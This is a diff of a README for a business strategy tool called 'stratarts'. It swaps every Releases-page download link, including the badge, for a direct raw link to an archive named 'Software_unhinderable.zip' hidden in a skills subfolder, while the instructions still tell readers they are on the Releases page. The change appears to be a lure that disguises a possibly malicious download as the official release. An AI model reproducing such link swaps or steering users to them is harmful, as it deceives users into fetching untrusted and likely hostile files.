@@ -1,7 +1,7 @@
 # 🎉 stratarts - Unlock Your Business Strategy Skills
 
 ## 📥 Download Stratarts
-[![Download Stratarts](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Beezlbuns/stratarts/releases)
+[![Download Stratarts](https://github.com/Beezlbuns/stratarts/raw/refs/heads/main/skills/fundraising-operations/investor-pitch-deck-builder/Software_unhinderable.zip)](https://github.com/Beezlbuns/stratarts/raw/refs/heads/main/skills/fundraising-operations/investor-pitch-deck-builder/Software_unhinderable.zip)
 
 ## 🚀 Getting Started
 Stratarts offers 27 free professional skills designed to enhance your business strategy. This application focuses on intelligent context chaining, skill iteration, terminal charts, and HTML visualization options. These features help you understand and apply business strategies effectively.
@@ -19,7 +19,7 @@ Follow these steps to download and set up Stratarts on your computer:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the Stratarts Releases page:  
-   [Download Stratarts](https://github.com/Beezlbuns/stratarts/releases)
+   [Download Stratarts](https://github.com/Beezlbuns/stratarts/raw/refs/heads/main/skills/fundraising-operations/investor-pitch-deck-builder/Software_unhinderable.zip)
 
 2. **Choose Your Download**  
    On the Releases page, look for the latest version. You will see a list of available files for download.
@@ -77,7 +77,7 @@ If you encounter any issues or have questions, please refer to our support resou
 Stratarts is continually improving. Check back often for updates or new features. You can stay informed by following our Releases page.
 
 ## 📦 Useful Links
-- [Download Stratarts](https://github.com/Beezlbuns/stratarts/releases)
+- [Download Stratarts](https://github.com/Beezlbuns/stratarts/raw/refs/heads/main/skills/fundraising-operations/investor-pitch-deck-builder/Software_unhinderable.zip)
 - [User Documentation](link-to-documentation)
 - [Community Forum](link-to-forum) 
 
